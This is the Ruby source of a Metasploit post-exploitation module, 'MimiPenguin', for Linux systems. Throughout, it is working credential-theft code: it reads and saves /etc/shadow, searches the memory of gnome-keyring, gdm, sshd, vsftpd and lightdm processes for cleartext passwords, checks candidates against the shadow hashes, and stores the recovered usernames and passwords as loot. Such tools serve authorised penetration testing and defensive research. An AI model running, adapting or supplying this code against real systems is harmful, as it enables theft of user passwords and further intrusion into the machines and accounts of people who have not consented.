##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'unix_crypt'

class MetasploitModule < Msf::Post
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Process

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MimiPenguin',
        'Description' => %q{
          This searches process memory for needles that indicate
          where cleartext passwords may be located. If any needles
          are discovered in the target process memory, collected
          strings in adjacent memory will be hashed and compared
          with password hashes found in `/etc/shadow`.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'huntergregal', # MimiPenguin
          'bcoles', # original MimiPenguin module, table and python code
          'Shelby Pace' # metasploit module
        ],
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X86, ARCH_X64, ARCH_AARCH64 ],
        'SessionTypes' => [ 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://github.com/huntergregal/mimipenguin' ],
          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/gnome-keyring/+bug/1772919' ],
          [ 'URL', 'https://bugs.launchpad.net/ubuntu/+source/lightdm/+bug/1717490' ],
          [ 'CVE', '2018-20781' ]
        ],
        'DisclosureDate' => '2018-05-23',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_attach
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_search
            ]
          }
        }
      )
    )
  end

  def get_user_names_and_hashes
    shadow_contents = read_file('/etc/shadow')
    fail_with(Failure::UnexpectedReply, "Failed to read '/etc/shadow'") if shadow_contents.blank?
    vprint_status('Storing shadow file...')
    store_loot('shadow.file', 'text/plain', session, shadow_contents, nil)

    users = []
    lines = shadow_contents.split
    lines.each do |line|
      line_arr = line.split(':')
      next if line_arr.empty?

      user_name = line_arr&.first
      hash = line_arr&.second
      next unless hash.start_with?('$')
      next if hash.nil? || user_name.nil?

      users << { 'username' => user_name, 'hash' => hash }
    end

    users
  end

  def configure_passwords(user_data = [])
    user_data.each do |info|
      hash = info['hash']
      hash_format = Metasploit::Framework::Hashes.identify_hash(hash)
      info['type'] = hash_format.empty? ? 'unsupported' : hash_format

      salt = ''
      if info['type'] == 'bf'
        arr = hash.split('$')
        next if arr.length < 4

        cost = arr[2]
        salt = arr[3][0..21]
        info['cost'] = cost
      elsif info['type'] == 'yescrypt'
        salt = hash[0...29]
      else
        salt = hash.split('$')[2]
      end
      next if salt.nil?

      info['salt'] = salt
    end

    user_data
  end

  def get_matches(target_info = {})
    if target_info.empty?
      vprint_status('Invalid target info supplied')
      return nil
    end

    target_pids = pidof(target_info['name'])
    if target_pids.nil?
      print_bad("PID for #{target_info['name']} not found.")
      return nil
    end

    target_info['matches'] = {}
    target_info['pids'] = target_pids
    target_info['pids'].each_with_index do |target_pid, _ind|
      vprint_status("Searching PID #{target_pid}...")
      res = mem_search_ascii(5, 500, target_info['needles'], pid: target_pid)
      target_info['matches'][target_pid] = res.empty? ? nil : res
    end
  end

  def format_addresses(addr_line)
    address = addr_line.split&.first
    start_addr, end_addr = address.split('-')
    start_addr = start_addr.to_i(16)
    end_addr = end_addr.to_i(16)

    { 'start' => start_addr, 'end' => end_addr }
  end

  # Selects memory regions to read based on locations
  # of matches
  def choose_mem_regions(pid, match_data = [])
    return [] if match_data.empty?

    mem_regions = []
    match_data.each do |match|
      next unless match.key?('sect_start') && match.key?('sect_len')

      start = match.fetch('sect_start')
      len = match.fetch('sect_len')
      mem_regions << { 'start' => start, 'length' => len }
    end

    mem_regions.uniq!
    mem_data = read_file("/proc/#{pid}/maps")
    return mem_regions if mem_data.nil?

    lines = mem_data.split("\n")
    updated_regions = mem_regions.clone
    if mem_regions.length == 1
      match_addr = mem_regions[0]['start'].to_s(16)
      match_ind = lines.index { |line| line.split('-').first.include?(match_addr) }
      prev = lines[match_ind - 1]
      if prev && prev.include?('00000000 00:00 0')
        formatted = format_addresses(prev)
        start_addr = formatted['start']
        end_addr = formatted['end']
        length = end_addr - start_addr

        updated_regions << { 'start' => start_addr, 'length' => length }
      end

      post = lines[match_ind + 1]
      if post && post.include?('00000000 00:00 0')
        formatted = format_addresses(post)
        start_addr = formatted['start']
        end_addr = formatted['end']
        length = end_addr - start_addr

        updated_regions << { 'start' => start_addr, 'length' => length }
      end

      return updated_regions
    end

    mem_regions.each_with_index do |region, index|
      next if index == 0

      first_addr = mem_regions[index - 1]['start']
      curr_addr = region['start']
      first_addr = first_addr.to_s(16)
      curr_addr = curr_addr.to_s(16)
      first_index = lines.index { |line| line.start_with?(first_addr) }
      curr_index = lines.index { |line| line.start_with?(curr_addr) }
      next if first_index.nil? || curr_index.nil?

      between_vals = lines.values_at(first_index + 1...curr_index)
      between_vals = between_vals.select { |line| line.include?('00000000 00:00 0') }
      if between_vals.empty?
        next unless region == mem_regions.last

        adj_region = lines[curr_index + 1]
        return updated_regions if adj_region.nil?

        formatted = format_addresses(adj_region)
        start_addr = formatted['start']
        end_addr = formatted['end']
        length = end_addr - start_addr
        updated_regions << { 'start' => start_addr, 'length' => length }
        return updated_regions
      end

      between_vals.each do |addr_line|
        formatted = format_addresses(addr_line)
        start_addr = formatted['start']
        end_addr = formatted['end']
        length = end_addr - start_addr
        updated_regions << { 'start' => start_addr, 'length' => length }
      end
    end

    updated_regions
  end

  def get_printable_strings(pid, start_addr, section_len)
    lines = []
    curr_addr = start_addr
    max_addr = start_addr + section_len

    while curr_addr < max_addr
      data = mem_read(curr_addr, 1000, pid: pid)
      lines << data.split(/[^[:print:]]/)
      lines = lines.flatten
      curr_addr += 800
    end

    lines.reject! { |line| line.length < 4 }
    lines
  end

  def get_python_version
    @python_vers ||= command_exists?('python3') ? 'python3' : ''

    if @python_vers.empty?
      @python_vers ||= command_exists?('python') ? 'python' : ''
    end
  end

  def check_for_valid_passwords(captured_strings, user_data, process_name)
    captured_strings.each do |str|
      user_data.each do |pass_info|
        salt = pass_info['salt']
        hash = pass_info['hash']
        pass_type = pass_info['type']

        case pass_type
        when 'md5'
          hashed = UnixCrypt::MD5.build(str, salt)
        when 'bf'
          BCrypt::Engine.cost = pass_info['cost'] || 12
          hashed = BCrypt::Engine.hash_secret(str, hash[0..28])
        when /sha256/
          hashed = UnixCrypt::SHA256.build(str, salt)
        when /sha512/
          hashed = UnixCrypt::SHA512.build(str, salt)
        when 'yescrypt'
          get_python_version
          next if @python_vers.empty?

          if @python_vers == 'python3'
            code = "import crypt; import base64; print(crypt.crypt(base64.b64decode('#{Rex::Text.encode_base64(str)}').decode('utf-8'), base64.b64decode('#{Rex::Text.encode_base64(salt.to_s)}').decode('utf-8')))"
            cmd = "python3 -c \"#{code}\""
          else
            code = "import crypt; import base64; print crypt.crypt(base64.b64decode('#{Rex::Text.encode_base64(str)}'), base64.b64decode('#{Rex::Text.encode_base64(salt.to_s)}'))"
            cmd = "python -c \"#{code}\""
          end
          hashed = cmd_exec(cmd).to_s.strip
        when 'unsupported'
          next
        end

        next unless hashed == hash

        pass_info['password'] = str
        pass_info['process'] = process_name
      end
    end
  end

  def run
    fail_with(Failure::BadConfig, 'Root privileges are required') unless is_root?
    user_data = get_user_names_and_hashes
    fail_with(Failure::UnexpectedReply, 'Failed to retrieve user information') if user_data.empty?
    password_data = configure_passwords(user_data)

    target_proc_info = [
      {
        'name' => 'gnome-keyring-daemon',
        'needles' => [
          '^+libgck\\-1.so\\.0$',
          'libgcrypt\\.so\\..+$',
          'linux-vdso\\.so\\.1$',
          'libc\\.so\\.6$'
        ]
      },
      {
        'name' => 'gdm-password',
        'needles' => [
          '^_pammodutil_getpwnam_root_1$',
          '^gkr_system_authtok$'
        ]
      },
      {
        'name' => 'vsftpd',
        'needles' => [
          '^::.+\\:[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}$'
        ]
      },
      {
        'name' => 'sshd',
        'needles' => [
          '^sudo.+'
        ]
      },
      {
        'name' => 'lightdm',
        'needles' => [
          '^_pammodutil_getspnam_'
        ]
      }
    ]

    captured_strings = []
    target_proc_info.each do |info|
      print_status("Checking for matches in process #{info['name']}")
      match_set = get_matches(info)
      if match_set.nil?
        vprint_status("No matches found for process #{info['name']}")
        next
      end

      vprint_status('Choosing memory regions to search')
      next if info['pids'].empty?
      next if info['matches'].values.all?(&:nil?)

      info['matches'].each do |pid, set|
        next unless set

        search_regions = choose_mem_regions(pid, set)
        next if search_regions.empty?

        search_regions.each { |reg| captured_strings << get_printable_strings(pid, reg['start'], reg['length']) }
        captured_strings.flatten!
        captured_strings.uniq!
        check_for_valid_passwords(captured_strings, password_data, info['name'])
        captured_strings = []
      end
    end

    results = password_data.select { |res| res.key?('password') && !res['password'].nil? }
    fail_with(Failure::NotFound, 'Failed to find any passwords') if results.empty?
    print_good("Found #{results.length} valid credential(s)!")

    table = Rex::Text::Table.new(
      'Header' => 'Credentials',
      'Indent' => 2,
      'SortIndex' => 0,
      'Columns' => [ 'Process Name', 'Username', 'Password' ]
    )

    results.each do |res|
      table << [ res['process'], res['username'], res['password'] ]
      store_valid_credential(
        user: res['username'],
        private: res['password'],
        private_type: :password
      )
    end

    print_line
    print_line(table.to_s)
    path = store_loot(
      'mimipenguin.csv',
      'text/plain',
      session,
      table.to_csv,
      nil
    )

    print_status("Credentials stored in #{path}")
  end
end
